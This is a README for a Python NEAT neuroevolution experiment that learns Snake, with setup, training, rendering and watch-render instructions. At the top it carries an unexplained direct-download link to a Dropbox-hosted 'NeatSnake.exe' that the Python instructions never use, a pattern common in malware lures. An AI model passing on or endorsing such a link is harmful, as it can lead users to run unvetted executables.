# download link

https://www.dropbox.com/scl/fi/9rfykngo9d12yqqfuxdip/NeatSnake.exe?rlkey=4njn9ltfn4zuny0jbhbopl4m6&st=d7gubo28&dl=1


# Neat Snake (NEAT + Headless-Friendly Live Rendering)

A small NEAT-style neuroevolution experiment that learns to play **Snake** on a grid.

This repo includes a renderer that can run interactively (via `turtle`) or fall back to text output if GUI backends aren’t available.

## Project structure

- `config.py` — all hyperparameters (grid size, NEAT params, reward shaping, etc.)
- `neat_brain.py` — genome representation + feedforward network construction
- `snake_env.py` — Snake environment and observations/reward shaping
- `train_parallel.py` — parallel fitness evaluation + checkpointing (best genome)
- `main.py` — CLI entrypoint (train, render, and **watch-render**)

Checkpoints:
- `checkpoints/best_genome.json` — overwritten periodically with the best genome so far

## Setup

Requires Python 3.x.

> Note: `turtle` GUI requires a working Tk installation. If turtle fails, rendering automatically switches to text mode.

## Quick start

### 1) Train

```bash
python -m neat_snake.main
```

Training periodically updates `checkpoints/best_genome.json` with the best genome so far.

### 2) Render best genome from checkpoint

```bash
python -m neat_snake.main --render
```

If a GUI is available, you’ll see a turtle window. Otherwise it prints a text-based run.

### 3) Live render while training (`--watch-render`)

Run training in one terminal:

```bash
python -m neat_snake.main
```

Then in another terminal:

```bash
python -m neat_snake.main --watch-render
```

This repeatedly reloads `checkpoints/best_genome.json` whenever it changes and renders an episode using the newest best genome.

Optional:

```bash
python -m neat_snake.main --watch-render --watch-sec=5 --watch-seed=111
```

- `--watch-sec` — polling interval (seconds) for checkpoint updates (default: `10`)
- `--watch-seed` — starting seed for episode variations (default: `111`)

## Notes / troubleshooting

- If turtle crashes with a Tk/Tcl error, `render_episode()` automatically falls back to text output.
- The watcher does not require any changes to training: it simply reads the checkpoint file that training already writes.

